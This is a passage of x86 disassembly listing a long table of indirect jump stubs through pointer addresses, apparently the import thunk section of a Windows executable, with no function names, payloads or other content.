  41b7fc:	jmp    DWORD PTR ds:0x41dacc
  41b802:	jmp    DWORD PTR ds:0x41dad0
  41b808:	jmp    DWORD PTR ds:0x41dad4
  41b80e:	jmp    DWORD PTR ds:0x41dad8
  41b814:	jmp    DWORD PTR ds:0x41dadc
  41b81a:	jmp    DWORD PTR ds:0x41dae0
  41b820:	jmp    DWORD PTR ds:0x41dae4
  41b826:	jmp    DWORD PTR ds:0x41dae8
  41b82c:	jmp    DWORD PTR ds:0x41daec
  41b832:	jmp    DWORD PTR ds:0x41daf0
  41b838:	jmp    DWORD PTR ds:0x41daf4
  41b83e:	jmp    DWORD PTR ds:0x41daf8
  41b844:	jmp    DWORD PTR ds:0x41dafc
  41b84a:	jmp    DWORD PTR ds:0x41db00
  41b850:	jmp    DWORD PTR ds:0x41db04
  41b856:	jmp    DWORD PTR ds:0x41db08
  41b85c:	jmp    DWORD PTR ds:0x41db0c
  41b862:	jmp    DWORD PTR ds:0x41db10
  41b868:	jmp    DWORD PTR ds:0x41db14
  41b86e:	jmp    DWORD PTR ds:0x41db18
  41b874:	jmp    DWORD PTR ds:0x41db1c
  41b87a:	jmp    DWORD PTR ds:0x41db20
  41b880:	jmp    DWORD PTR ds:0x41db24
  41b886:	jmp    DWORD PTR ds:0x41db28
  41b88c:	jmp    DWORD PTR ds:0x41db2c
  41b892:	jmp    DWORD PTR ds:0x41db30
  41b898:	jmp    DWORD PTR ds:0x41db34
  41b89e:	jmp    DWORD PTR ds:0x41db38
  41b8a4:	jmp    DWORD PTR ds:0x41db3c
  41b8aa:	jmp    DWORD PTR ds:0x41db40
  41b8b0:	jmp    DWORD PTR ds:0x41db44
  41b8b6:	jmp    DWORD PTR ds:0x41db48
  41b8bc:	jmp    DWORD PTR ds:0x41db4c
  41b8c2:	jmp    DWORD PTR ds:0x41db50
  41b8c8:	jmp    DWORD PTR ds:0x41db54
  41b8ce:	jmp    DWORD PTR ds:0x41db58
  41b8d4:	jmp    DWORD PTR ds:0x41db5c
  41b8da:	jmp    DWORD PTR ds:0x41db60
  41b8e0:	jmp    DWORD PTR ds:0x41db64
  41b8e6:	jmp    DWORD PTR ds:0x41db68
  41b8ec:	jmp    DWORD PTR ds:0x41db6c
  41b8f2:	jmp    DWORD PTR ds:0x41db70
  41b8f8:	jmp    DWORD PTR ds:0x41db74
  41b8fe:	jmp    DWORD PTR ds:0x41db78
  41b904:	jmp    DWORD PTR ds:0x41db7c
  41b90a:	jmp    DWORD PTR ds:0x41db80
  41b910:	jmp    DWORD PTR ds:0x41db84
  41b916:	jmp    DWORD PTR ds:0x41db88
  41b91c:	jmp    DWORD PTR ds:0x41db8c
  41b922:	jmp    DWORD PTR ds:0x41db90
  41b928:	jmp    DWORD PTR ds:0x41db94
  41b92e:	jmp    DWORD PTR ds:0x41db98
  41b934:	jmp    DWORD PTR ds:0x41db9c
  41b93a:	jmp    DWORD PTR ds:0x41dba0
  41b940:	jmp    DWORD PTR ds:0x41dba4
  41b946:	jmp    DWORD PTR ds:0x41dba8
  41b94c:	jmp    DWORD PTR ds:0x41dbac
  41b952:	jmp    DWORD PTR ds:0x41dbb0
  41b958:	jmp    DWORD PTR ds:0x41dbb4
  41b95e:	jmp    DWORD PTR ds:0x41dbb8
  41b964:	jmp    DWORD PTR ds:0x41dbbc
  41b96a:	jmp    DWORD PTR ds:0x41dbc0
  41b970:	jmp    DWORD PTR ds:0x41dbc4
  41b976:	jmp    DWORD PTR ds:0x41dbc8
  41b97c:	jmp    DWORD PTR ds:0x41dbcc
  41b982:	jmp    DWORD PTR ds:0x41dbd0
  41b988:	jmp    DWORD PTR ds:0x41dbd4
  41b98e:	jmp    DWORD PTR ds:0x41dbd8
  41b994:	jmp    DWORD PTR ds:0x41dbdc
  41b99a:	jmp    DWORD PTR ds:0x41dbe0
  41b9a0:	jmp    DWORD PTR ds:0x41dbe4
  41b9a6:	jmp    DWORD PTR ds:0x41dbe8
  41b9ac:	jmp    DWORD PTR ds:0x41dbec
  41b9b2:	jmp    DWORD PTR ds:0x41dbf0
  41b9b8:	jmp    DWORD PTR ds:0x41dbf4
  41b9be:	jmp    DWORD PTR ds:0x41dbf8
  41b9c4:	jmp    DWORD PTR ds:0x41dbfc
  41b9ca:	jmp    DWORD PTR ds:0x41dc00
  41b9d0:	jmp    DWORD PTR ds:0x41dc04
  41b9d6:	jmp    DWORD PTR ds:0x41dc08
  41b9dc:	jmp    DWORD PTR ds:0x41dc0c
  41b9e2:	jmp    DWORD PTR ds:0x41dc10
  41b9e8:	jmp    DWORD PTR ds:0x41dc14
  41b9ee:	jmp    DWORD PTR ds:0x41dc18
  41b9f4:	jmp    DWORD PTR ds:0x41dc1c
  41b9fa:	jmp    DWORD PTR ds:0x41dc20
  41ba00:	jmp    DWORD PTR ds:0x41dc24
  41ba06:	jmp    DWORD PTR ds:0x41dc28
  41ba0c:	jmp    DWORD PTR ds:0x41dc2c
  41ba12:	jmp    DWORD PTR ds:0x41dc30
  41ba18:	jmp    DWORD PTR ds:0x41dc34
  41ba1e:	jmp    DWORD PTR ds:0x41dc38
  41ba24:	jmp    DWORD PTR ds:0x41dc3c
  41ba2a:	jmp    DWORD PTR ds:0x41dc40
  41ba30:	jmp    DWORD PTR ds:0x41dc44
  41ba36:	jmp    DWORD PTR ds:0x41dc48
  41ba3c:	jmp    DWORD PTR ds:0x41dc4c
  41ba42:	jmp    DWORD PTR ds:0x41dc50
  41ba48:	jmp    DWORD PTR ds:0x41dc54
  41ba4e:	jmp    DWORD PTR ds:0x41dc58
  41ba54:	jmp    DWORD PTR ds:0x41dc5c
  41ba5a:	jmp    DWORD PTR ds:0x41dc60
  41ba60:	jmp    DWORD PTR ds:0x41dc64
  41ba66:	jmp    DWORD PTR ds:0x41dc68
  41ba6c:	jmp    DWORD PTR ds:0x41dc6c
  41ba72:	jmp    DWORD PTR ds:0x41dc70
  41ba78:	jmp    DWORD PTR ds:0x41dc74
  41ba7e:	jmp    DWORD PTR ds:0x41dc78
  41ba84:	jmp    DWORD PTR ds:0x41dc7c
  41ba8a:	jmp    DWORD PTR ds:0x41dc80
  41ba90:	jmp    DWORD PTR ds:0x41dc84
  41ba96:	jmp    DWORD PTR ds:0x41dc88
  41ba9c:	jmp    DWORD PTR ds:0x41dc8c
  41baa2:	jmp    DWORD PTR ds:0x41dc90
  41baa8:	jmp    DWORD PTR ds:0x41dc94
  41baae:	jmp    DWORD PTR ds:0x41dc98
  41bab4:	jmp    DWORD PTR ds:0x41dc9c
  41baba:	jmp    DWORD PTR ds:0x41dca0
  41bac0:	jmp    DWORD PTR ds:0x41dca4
  41bac6:	jmp    DWORD PTR ds:0x41dca8
  41bacc:	jmp    DWORD PTR ds:0x41dcac
  41bad2:	jmp    DWORD PTR ds:0x41dcb0
  41bad8:	jmp    DWORD PTR ds:0x41dcb4
  41bade:	jmp    DWORD PTR ds:0x41dcb8
  41bae4:	jmp    DWORD PTR ds:0x41dcbc
  41baea:	jmp    DWORD PTR ds:0x41dcc0
  41baf0:	jmp    DWORD PTR ds:0x41dcc4
  41baf6:	jmp    DWORD PTR ds:0x41dccc
  41bafc:	jmp    DWORD PTR ds:0x41dcd0
  41bb02:	jmp    DWORD PTR ds:0x41dcd4
  41bb08:	jmp    DWORD PTR ds:0x41dcd8
  41bb0e:	jmp    DWORD PTR ds:0x41dcdc
  41bb14:	jmp    DWORD PTR ds:0x41dce0
  41bb1a:	jmp    DWORD PTR ds:0x41dce4
  41bb20:	jmp    DWORD PTR ds:0x41dce8
  41bb26:	jmp    DWORD PTR ds:0x41dcec
  41bb2c:	jmp    DWORD PTR ds:0x41dcf0
  41bb32:	jmp    DWORD PTR ds:0x41dcf4
  41bb38:	jmp    DWORD PTR ds:0x41dcf8
  41bb3e:	jmp    DWORD PTR ds:0x41dcfc
  41bb44:	jmp    DWORD PTR ds:0x41dd00
  41bb4a:	jmp    DWORD PTR ds:0x41dd04
  41bb50:	jmp    DWORD PTR ds:0x41dd08
  41bb56:	jmp    DWORD PTR ds:0x41dd0c
  41bb5c:	jmp    DWORD PTR ds:0x41dd10
  41bb62:	jmp    DWORD PTR ds:0x41dd14
  41bb68:	jmp    DWORD PTR ds:0x41dd18
  41bb6e:	jmp    DWORD PTR ds:0x41dd1c
  41bb74:	jmp    DWORD PTR ds:0x41dd20
  41bb7a:	jmp    DWORD PTR ds:0x41dd24
  41bb80:	jmp    DWORD PTR ds:0x41dd28
  41bb86:	jmp    DWORD PTR ds:0x41dd2c
  41bb8c:	jmp    DWORD PTR ds:0x41dd30
  41bb92:	jmp    DWORD PTR ds:0x41dd34
  41bb98:	jmp    DWORD PTR ds:0x41dd38
  41bb9e:	jmp    DWORD PTR ds:0x41dd3c
  41bba4:	jmp    DWORD PTR ds:0x41dd40
  41bbaa:	jmp    DWORD PTR ds:0x41dd44
  41bbb0:	jmp    DWORD PTR ds:0x41dd48
  41bbb6:	jmp    DWORD PTR ds:0x41dd4c
  41bbbc:	jmp    DWORD PTR ds:0x41dd50
  41bbc2:	jmp    DWORD PTR ds:0x41dd54
  41bbc8:	jmp    DWORD PTR ds:0x41dd58
  41bbce:	jmp    DWORD PTR ds:0x41dd5c
  41bbd4:	jmp    DWORD PTR ds:0x41dd60
  41bbda:	jmp    DWORD PTR ds:0x41dd64
  41bbe0:	jmp    DWORD PTR ds:0x41dd68
  41bbe6:	jmp    DWORD PTR ds:0x41dd6c
  41bbec:	jmp    DWORD PTR ds:0x41dd70
  41bbf2:	jmp    DWORD PTR ds:0x41dd74
  41bbf8:	jmp    DWORD PTR ds:0x41dd78
  41bbfe:	jmp    DWORD PTR ds:0x41dd7c
  41bc04:	jmp    DWORD PTR ds:0x41dd80
  41bc0a:	jmp    DWORD PTR ds:0x41dd84
  41bc10:	jmp    DWORD PTR ds:0x41dd88
  41bc16:	jmp    DWORD PTR ds:0x41dd8c
  41bc1c:	jmp    DWORD PTR ds:0x41dd90
  41bc22:	jmp    DWORD PTR ds:0x41dd94
  41bc28:	jmp    DWORD PTR ds:0x41dd98
  41bc2e:	jmp    DWORD PTR ds:0x41dd9c
  41bc34:	jmp    DWORD PTR ds:0x41dda0
  41bc3a:	jmp    DWORD PTR ds:0x41dda4
  41bc40:	jmp    DWORD PTR ds:0x41dda8
  41bc46:	jmp    DWORD PTR ds:0x41ddac
  41bc4c:	jmp    DWORD PTR ds:0x41ddb0
  41bc52:	jmp    DWORD PTR ds:0x41ddb4
  41bc58:	jmp    DWORD PTR ds:0x41ddb8
  41bc5e:	jmp    DWORD PTR ds:0x41ddbc
  41bc64:	jmp    DWORD PTR ds:0x41ddc0
  41bc6a:	jmp    DWORD PTR ds:0x41ddc4
  41bc70:	jmp    DWORD PTR ds:0x41ddc8
  41bc76:	jmp    DWORD PTR ds:0x41ddcc
  41bc7c:	jmp    DWORD PTR ds:0x41ddd0
  41bc82:	jmp    DWORD PTR ds:0x41ddd4
  41bc88:	jmp    DWORD PTR ds:0x41ddd8
  41bc8e:	jmp    DWORD PTR ds:0x41dddc
  41bc94:	jmp    DWORD PTR ds:0x41dde0
  41bc9a:	jmp    DWORD PTR ds:0x41dde4
  41bca0:	jmp    DWORD PTR ds:0x41dde8
  41bca6:	jmp    DWORD PTR ds:0x41ddec
  41bcac:	jmp    DWORD PTR ds:0x41ddf0
  41bcb2:	jmp    DWORD PTR ds:0x41ddf4
  41bcb8:	jmp    DWORD PTR ds:0x41ddf8
  41bcbe:	jmp    DWORD PTR ds:0x41ddfc
  41bcc4:	jmp    DWORD PTR ds:0x41de00
  41bcca:	jmp    DWORD PTR ds:0x41de04
  41bcd0:	jmp    DWORD PTR ds:0x41de08
  41bcd6:	jmp    DWORD PTR ds:0x41de0c
  41bcdc:	jmp    DWORD PTR ds:0x41de10
  41bce2:	jmp    DWORD PTR ds:0x41de14
  41bce8:	jmp    DWORD PTR ds:0x41de18
  41bcee:	jmp    DWORD PTR ds:0x41de1c
  41bcf4:	jmp    DWORD PTR ds:0x41de20
  41bcfa:	jmp    DWORD PTR ds:0x41de24
  41bd00:	jmp    DWORD PTR ds:0x41de28
  41bd06:	jmp    DWORD PTR ds:0x41de2c
  41bd0c:	jmp    DWORD PTR ds:0x41de30
  41bd12:	jmp    DWORD PTR ds:0x41de34
  41bd18:	jmp    DWORD PTR ds:0x41de38
  41bd1e:	jmp    DWORD PTR ds:0x41de3c
  41bd24:	jmp    DWORD PTR ds:0x41de40
  41bd2a:	jmp    DWORD PTR ds:0x41de44
  41bd30:	jmp    DWORD PTR ds:0x41de48
  41bd36:	jmp    DWORD PTR ds:0x41de4c
  41bd3c:	jmp    DWORD PTR ds:0x41de50
  41bd42:	jmp    DWORD PTR ds:0x41de54
  41bd48:	jmp    DWORD PTR ds:0x41de58
  41bd4e:	jmp    DWORD PTR ds:0x41de5c
  41bd54:	jmp    DWORD PTR ds:0x41de60
  41bd5a:	jmp    DWORD PTR ds:0x41de64
  41bd60:	jmp    DWORD PTR ds:0x41de68
  41bd66:	jmp    DWORD PTR ds:0x41de6c
  41bd6c:	jmp    DWORD PTR ds:0x41de70
  41bd72:	jmp    DWORD PTR ds:0x41de74
  41bd78:	jmp    DWORD PTR ds:0x41de78
  41bd7e:	jmp    DWORD PTR ds:0x41de7c
  41bd84:	jmp    DWORD PTR ds:0x41de80
  41bd8a:	jmp    DWORD PTR ds:0x41de84
  41bd90:	jmp    DWORD PTR ds:0x41de88
  41bd96:	jmp    DWORD PTR ds:0x41de8c
  41bd9c:	jmp    DWORD PTR ds:0x41de90
  41bda2:	jmp    DWORD PTR ds:0x41de94
  41bda8:	jmp    DWORD PTR ds:0x41de98
  41bdae:	jmp    DWORD PTR ds:0x41de9c
  41bdb4:	jmp    DWORD PTR ds:0x41dea0
  41bdba:	jmp    DWORD PTR ds:0x41dea4
  41bdc0:	jmp    DWORD PTR ds:0x41dea8
  41bdc6:	jmp    DWORD PTR ds:0x41deac
  41bdcc:	jmp    DWORD PTR ds:0x41deb0
  41bdd2:	jmp    DWORD PTR ds:0x41deb4
  41bdd8:	jmp    DWORD PTR ds:0x41deb8
  41bdde:	jmp    DWORD PTR ds:0x41debc
  41bde4:	jmp    DWORD PTR ds:0x41dec0
  41bdea:	jmp    DWORD PTR ds:0x41dec4
  41bdf0:	jmp    DWORD PTR ds:0x41dec8
  41bdf6:	jmp    DWORD PTR ds:0x41decc
  41bdfc:	jmp    DWORD PTR ds:0x41ded0
  41be02:	jmp    DWORD PTR ds:0x41ded4
  41be08:	jmp    DWORD PTR ds:0x41ded8
  41be0e:	jmp    DWORD PTR ds:0x41dedc
  41be14:	jmp    DWORD PTR ds:0x41dee0
  41be1a:	jmp    DWORD PTR ds:0x41dee4
  41be20:	jmp    DWORD PTR ds:0x41dee8
  41be26:	jmp    DWORD PTR ds:0x41deec
  41be2c:	jmp    DWORD PTR ds:0x41def0
  41be32:	jmp    DWORD PTR ds:0x41def4
  41be38:	jmp    DWORD PTR ds:0x41def8
  41be3e:	jmp    DWORD PTR ds:0x41defc
  41be44:	jmp    DWORD PTR ds:0x41df00
  41be4a:	jmp    DWORD PTR ds:0x41df04
  41be50:	jmp    DWORD PTR ds:0x41df08
  41be56:	jmp    DWORD PTR ds:0x41df0c
  41be5c:	jmp    DWORD PTR ds:0x41df10
  41be62:	jmp    DWORD PTR ds:0x41df14
  41be68:	jmp    DWORD PTR ds:0x41df18
  41be6e:	jmp    DWORD PTR ds:0x41df1c
  41be74:	jmp    DWORD PTR ds:0x41df20
  41be7a:	jmp    DWORD PTR ds:0x41df24
  41be80:	jmp    DWORD PTR ds:0x41df28
  41be86:	jmp    DWORD PTR ds:0x41df2c
  41be8c:	jmp    DWORD PTR ds:0x41df30
  41be92:	jmp    DWORD PTR ds:0x41df34
  41be98:	jmp    DWORD PTR ds:0x41df38
  41be9e:	jmp    DWORD PTR ds:0x41df3c
  41bea4:	jmp    DWORD PTR ds:0x41df40
  41beaa:	jmp    DWORD PTR ds:0x41df44
  41beb0:	jmp    DWORD PTR ds:0x41df48
  41beb6:	jmp    DWORD PTR ds:0x41df4c
  41bebc:	jmp    DWORD PTR ds:0x41df50
  41bec2:	jmp    DWORD PTR ds:0x41df54
  41bec8:	jmp    DWORD PTR ds:0x41df58
  41bece:	jmp    DWORD PTR ds:0x41df5c
  41bed4:	jmp    DWORD PTR ds:0x41df60
  41beda:	jmp    DWORD PTR ds:0x41df64
  41bee0:	jmp    DWORD PTR ds:0x41df68
  41bee6:	jmp    DWORD PTR ds:0x41df6c
  41beec:	jmp    DWORD PTR ds:0x41df70
  41bef2:	jmp    DWORD PTR ds:0x41df74
  41bef8:	jmp    DWORD PTR ds:0x41df78
  41befe:	jmp    DWORD PTR ds:0x41df7c
  41bf04:	jmp    DWORD PTR ds:0x41df80
  41bf0a:	jmp    DWORD PTR ds:0x41df84
  41bf10:	jmp    DWORD PTR ds:0x41df88
  41bf16:	jmp    DWORD PTR ds:0x41df8c
  41bf1c:	jmp    DWORD PTR ds:0x41df90
  41bf22:	jmp    DWORD PTR ds:0x41df94
  41bf28:	jmp    DWORD PTR ds:0x41df98
  41bf2e:	jmp    DWORD PTR ds:0x41df9c
  41bf34:	jmp    DWORD PTR ds:0x41dfa0
  41bf3a:	jmp    DWORD PTR ds:0x41dfa4
  41bf40:	jmp    DWORD PTR ds:0x41dfa8
  41bf46:	jmp    DWORD PTR ds:0x41dfac
  41bf4c:	jmp    DWORD PTR ds:0x41dfb0
  41bf52:	jmp    DWORD PTR ds:0x41dfb4
  41bf58:	jmp    DWORD PTR ds:0x41dfb8
  41bf5e:	jmp    DWORD PTR ds:0x41dfbc
  41bf64:	jmp    DWORD PTR ds:0x41dfc0
  41bf6a:	jmp    DWORD PTR ds:0x41dfc4
  41bf70:	jmp    DWORD PTR ds:0x41dfc8
  41bf76:	jmp    DWORD PTR ds:0x41dfcc
  41bf7c:	jmp    DWORD PTR ds:0x41dfd0
  41bf82:	jmp    DWORD PTR ds:0x41dfd4
  41bf88:	jmp    DWORD PTR ds:0x41dfd8
  41bf8e:	jmp    DWORD PTR ds:0x41dfdc
  41bf94:	jmp    DWORD PTR ds:0x41dfe0
  41bf9a:	jmp    DWORD PTR ds:0x41dfe4
  41bfa0:	jmp    DWORD PTR ds:0x41dfe8
  41bfa6:	jmp    DWORD PTR ds:0x41dfec
  41bfac:	jmp    DWORD PTR ds:0x41dff0
  41bfb2:	jmp    DWORD PTR ds:0x41dff4
  41bfb8:	jmp    DWORD PTR ds:0x41dff8
  41bfbe:	jmp    DWORD PTR ds:0x41dffc
  41bfc4:	jmp    DWORD PTR ds:0x41e000
  41bfca:	jmp    DWORD PTR ds:0x41e004
  41bfd0:	jmp    DWORD PTR ds:0x41e008
  41bfd6:	jmp    DWORD PTR ds:0x41e00c
  41bfdc:	jmp    DWORD PTR ds:0x41e010
  41bfe2:	jmp    DWORD PTR ds:0x41e014
  41bfe8:	jmp    DWORD PTR ds:0x41e018
  41bfee:	jmp    DWORD PTR ds:0x41e01c
  41bff4:	jmp    DWORD PTR ds:0x41e020
  41bffa:	jmp    DWORD PTR ds:0x41e024
  41c000:	jmp    DWORD PTR ds:0x41e028
  41c006:	jmp    DWORD PTR ds:0x41e02c
  41c00c:	jmp    DWORD PTR ds:0x41e030
  41c012:	jmp    DWORD PTR ds:0x41e034
  41c018:	jmp    DWORD PTR ds:0x41e038
  41c01e:	jmp    DWORD PTR ds:0x41e03c
  41c024:	jmp    DWORD PTR ds:0x41e040
  41c02a:	jmp    DWORD PTR ds:0x41e044
  41c030:	jmp    DWORD PTR ds:0x41e048
  41c036:	jmp    DWORD PTR ds:0x41e04c
  41c03c:	jmp    DWORD PTR ds:0x41e050
  41c042:	jmp    DWORD PTR ds:0x41e054
  41c048:	jmp    DWORD PTR ds:0x41e058
  41c04e:	jmp    DWORD PTR ds:0x41e05c
  41c054:	jmp    DWORD PTR ds:0x41e060
  41c05a:	jmp    DWORD PTR ds:0x41e064
  41c060:	jmp    DWORD PTR ds:0x41e068
  41c066:	jmp    DWORD PTR ds:0x41e06c
  41c06c:	jmp    DWORD PTR ds:0x41e070
  41c072:	jmp    DWORD PTR ds:0x41e074
  41c078:	jmp    DWORD PTR ds:0x41e078
  41c07e:	jmp    DWORD PTR ds:0x41e07c
  41c084:	jmp    DWORD PTR ds:0x41e080
  41c08a:	jmp    DWORD PTR ds:0x41e084
  41c090:	jmp    DWORD PTR ds:0x41e088
  41c096:	jmp    DWORD PTR ds:0x41e08c
  41c09c:	jmp    DWORD PTR ds:0x41e090
  41c0a2:	jmp    DWORD PTR ds:0x41e094
  41c0a8:	jmp    DWORD PTR ds:0x41e098
  41c0ae:	jmp    DWORD PTR ds:0x41e09c
  41c0b4:	jmp    DWORD PTR ds:0x41e0a0
  41c0ba:	jmp    DWORD PTR ds:0x41e0a8
  41c0c0:	jmp    DWORD PTR ds:0x41e0b0
  41c0c6:	jmp    DWORD PTR ds:0x41e0b4
  41c0cc:	jmp    DWORD PTR ds:0x41e0b8
  41c0d2:	jmp    DWORD PTR ds:0x41e0bc
  41c0d8:	jmp    DWORD PTR ds:0x41e0c0
  41c0de:	jmp    DWORD PTR ds:0x41e0c4
  41c0e4:	jmp    DWORD PTR ds:0x41e0c8
  41c0ea:	jmp    DWORD PTR ds:0x41e0cc
  41c0f0:	jmp    DWORD PTR ds:0x41e0d0
  41c0f6:	jmp    DWORD PTR ds:0x41e0d4
  41c0fc:	jmp    DWORD PTR ds:0x41e0d8
  41c102:	jmp    DWORD PTR ds:0x41e0dc
  41c108:	jmp    DWORD PTR ds:0x41e0e0
  41c10e:	jmp    DWORD PTR ds:0x41e0e4
  41c114:	jmp    DWORD PTR ds:0x41e0e8
  41c11a:	jmp    DWORD PTR ds:0x41e0ec
  41c120:	jmp    DWORD PTR ds:0x41e0f0
  41c126:	jmp    DWORD PTR ds:0x41e0f4
  41c12c:	jmp    DWORD PTR ds:0x41e0f8
  41c132:	jmp    DWORD PTR ds:0x41e0fc
  41c138:	jmp    DWORD PTR ds:0x41e100
  41c13e:	jmp    DWORD PTR ds:0x41e104
  41c144:	jmp    DWORD PTR ds:0x41e108
  41c14a:	jmp    DWORD PTR ds:0x41e10c
  41c150:	jmp    DWORD PTR ds:0x41e110
  41c156:	jmp    DWORD PTR ds:0x41e114
  41c15c:	jmp    DWORD PTR ds:0x41e118
  41c162:	jmp    DWORD PTR ds:0x41e11c
  41c168:	jmp    DWORD PTR ds:0x41e120
  41c16e:	jmp    DWORD PTR ds:0x41e124
  41c174:	jmp    DWORD PTR ds:0x41e128
  41c17a:	jmp    DWORD PTR ds:0x41e12c
  41c180:	jmp    DWORD PTR ds:0x41e130
  41c186:	jmp    DWORD PTR ds:0x41e134
  41c18c:	jmp    DWORD PTR ds:0x41e138
  41c192:	jmp    DWORD PTR ds:0x41e13c
  41c198:	jmp    DWORD PTR ds:0x41e140
  41c19e:	jmp    DWORD PTR ds:0x41e144
  41c1a4:	jmp    DWORD PTR ds:0x41e148
  41c1aa:	jmp    DWORD PTR ds:0x41e14c
  41c1b0:	jmp    DWORD PTR ds:0x41e150
  41c1b6:	jmp    DWORD PTR ds:0x41e154
  41c1bc:	jmp    DWORD PTR ds:0x41e158
  41c1c2:	jmp    DWORD PTR ds:0x41e15c
  41c1c8:	jmp    DWORD PTR ds:0x41e160
  41c1ce:	jmp    DWORD PTR ds:0x41e164
  41c1d4:	jmp    DWORD PTR ds:0x41e168
  41c1da:	jmp    DWORD PTR ds:0x41e16c
  41c1e0:	jmp    DWORD PTR ds:0x41e170
  41c1e6:	jmp    DWORD PTR ds:0x41e174
  41c1ec:	jmp    DWORD PTR ds:0x41e178
  41c1f2:	jmp    DWORD PTR ds:0x41e17c
  41c1f8:	jmp    DWORD PTR ds:0x41e180
  41c1fe:	jmp    DWORD PTR ds:0x41e184
  41c204:	jmp    DWORD PTR ds:0x41e188
  41c20a:	jmp    DWORD PTR ds:0x41e18c
  41c210:	jmp    DWORD PTR ds:0x41e190
  41c216:	jmp    DWORD PTR ds:0x41e194
  41c21c:	jmp    DWORD PTR ds:0x41e198
  41c222:	jmp    DWORD PTR ds:0x41e19c
  41c228:	jmp    DWORD PTR ds:0x41e1a0
  41c22e:	jmp    DWORD PTR ds:0x41e1a4
  41c234:	jmp    DWORD PTR ds:0x41e1a8
  41c23a:	jmp    DWORD PTR ds:0x41e1ac
  41c240:	jmp    DWORD PTR ds:0x41e1b0
  41c246:	jmp    DWORD PTR ds:0x41e1b4
  41c24c:	jmp    DWORD PTR ds:0x41e1b8
  41c252:	jmp    DWORD PTR ds:0x41e1bc
  41c258:	jmp    DWORD PTR ds:0x41e1c0
  41c25e:	jmp    DWORD PTR ds:0x41e1c4
  41c264:	jmp    DWORD PTR ds:0x41e1c8
  41c26a:	jmp    DWORD PTR ds:0x41e1cc
  41c270:	jmp    DWORD PTR ds:0x41e1d0
  41c276:	jmp    DWORD PTR ds:0x41e1d4
  41c27c:	jmp    DWORD PTR ds:0x41e1d8
  41c282:	jmp    DWORD PTR ds:0x41e1dc
  41c288:	jmp    DWORD PTR ds:0x41e1e0
  41c28e:	jmp    DWORD PTR ds:0x41e1e4
  41c294:	jmp    DWORD PTR ds:0x41e1e8
  41c29a:	jmp    DWORD PTR ds:0x41e1ec
  41c2a0:	jmp    DWORD PTR ds:0x41e1f0
  41c2a6:	jmp    DWORD PTR ds:0x41e1f4
  41c2ac:	jmp    DWORD PTR ds:0x41e1f8
  41c2b2:	jmp    DWORD PTR ds:0x41e1fc
  41c2b8:	jmp    DWORD PTR ds:0x41e200
  41c2be:	jmp    DWORD PTR ds:0x41e204
  41c2c4:	jmp    DWORD PTR ds:0x41e208
  41c2ca:	jmp    DWORD PTR ds:0x41e20c
  41c2d0:	jmp    DWORD PTR ds:0x41e210
  41c2d6:	jmp    DWORD PTR ds:0x41e214
  41c2dc:	jmp    DWORD PTR ds:0x41e218
  41c2e2:	jmp    DWORD PTR ds:0x41e21c
  41c2e8:	jmp    DWORD PTR ds:0x41e220
  41c2ee:	jmp    DWORD PTR ds:0x41e224
  41c2f4:	jmp    DWORD PTR ds:0x41e228
  41c2fa:	jmp    DWORD PTR ds:0x41e22c
  41c300:	jmp    DWORD PTR ds:0x41e230
  41c306:	jmp    DWORD PTR ds:0x41e234
  41c30c:	jmp    DWORD PTR ds:0x41e238
  41c312:	jmp    DWORD PTR ds:0x41e23c
  41c318:	jmp    DWORD PTR ds:0x41e240
  41c31e:	jmp    DWORD PTR ds:0x41e244
  41c324:	jmp    DWORD PTR ds:0x41e248
  41c32a:	jmp    DWORD PTR ds:0x41e24c
  41c330:	jmp    DWORD PTR ds:0x41e250
  41c336:	jmp    DWORD PTR ds:0x41e254
  41c33c:	jmp    DWORD PTR ds:0x41e258
  41c342:	jmp    DWORD PTR ds:0x41e25c
  41c348:	jmp    DWORD PTR ds:0x41e260
  41c34e:	jmp    DWORD PTR ds:0x41e264
  41c354:	jmp    DWORD PTR ds:0x41e268
  41c35a:	jmp    DWORD PTR ds:0x41e26c
  41c360:	jmp    DWORD PTR ds:0x41e270
  41c366:	jmp    DWORD PTR ds:0x41e274
  41c36c:	jmp    DWORD PTR ds:0x41e278
  41c372:	jmp    DWORD PTR ds:0x41e27c
  41c378:	jmp    DWORD PTR ds:0x41e280
  41c37e:	jmp    DWORD PTR ds:0x41e284
  41c384:	jmp    DWORD PTR ds:0x41e288
  41c38a:	jmp    DWORD PTR ds:0x41e28c
  41c390:	jmp    DWORD PTR ds:0x41e290
  41c396:	jmp    DWORD PTR ds:0x41e294
  41c39c:	jmp    DWORD PTR ds:0x41e298
  41c3a2:	jmp    DWORD PTR ds:0x41e29c
  41c3a8:	jmp    DWORD PTR ds:0x41e2a0
  41c3ae:	jmp    DWORD PTR ds:0x41e2a4
  41c3b4:	jmp    DWORD PTR ds:0x41e2a8
  41c3ba:	jmp    DWORD PTR ds:0x41e2ac
  41c3c0:	jmp    DWORD PTR ds:0x41e2b0
  41c3c6:	jmp    DWORD PTR ds:0x41e2b4
  41c3cc:	jmp    DWORD PTR ds:0x41e2b8
  41c3d2:	jmp    DWORD PTR ds:0x41e2bc
  41c3d8:	jmp    DWORD PTR ds:0x41e2c0
  41c3de:	jmp    DWORD PTR ds:0x41e2c4
  41c3e4:	jmp    DWORD PTR ds:0x41e2c8
  41c3ea:	jmp    DWORD PTR ds:0x41e2cc
  41c3f0:	jmp    DWORD PTR ds:0x41e2d0
  41c3f6:	jmp    DWORD PTR ds:0x41e2d4
  41c3fc:	jmp    DWORD PTR ds:0x41e2d8
  41c402:	jmp    DWORD PTR ds:0x41e2dc
  41c408:	jmp    DWORD PTR ds:0x41e2e0
  41c40e:	jmp    DWORD PTR ds:0x41e2e4
  41c414:	jmp    DWORD PTR ds:0x41e2e8
  41c41a:	jmp    DWORD PTR ds:0x41e2ec
  41c420:	jmp    DWORD PTR ds:0x41e2f0
  41c426:	jmp    DWORD PTR ds:0x41e2f4
  41c42c:	jmp    DWORD PTR ds:0x41e2f8
  41c432:	jmp    DWORD PTR ds:0x41e2fc
  41c438:	jmp    DWORD PTR ds:0x41e300
  41c43e:	jmp    DWORD PTR ds:0x41e304
  41c444:	jmp    DWORD PTR ds:0x41e308
  41c44a:	jmp    DWORD PTR ds:0x41e30c
  41c450:	jmp    DWORD PTR ds:0x41e310
  41c456:	jmp    DWORD PTR ds:0x41e314
  41c45c:	jmp    DWORD PTR ds:0x41e318
  41c462:	jmp    DWORD PTR ds:0x41e31c
  41c468:	jmp    DWORD PTR ds:0x41e320
  41c46e:	jmp    DWORD PTR ds:0x41e324
  41c474:	jmp    DWORD PTR ds:0x41e328
  41c47a:	jmp    DWORD PTR ds:0x41e32c
  41c480:	jmp    DWORD PTR ds:0x41e330
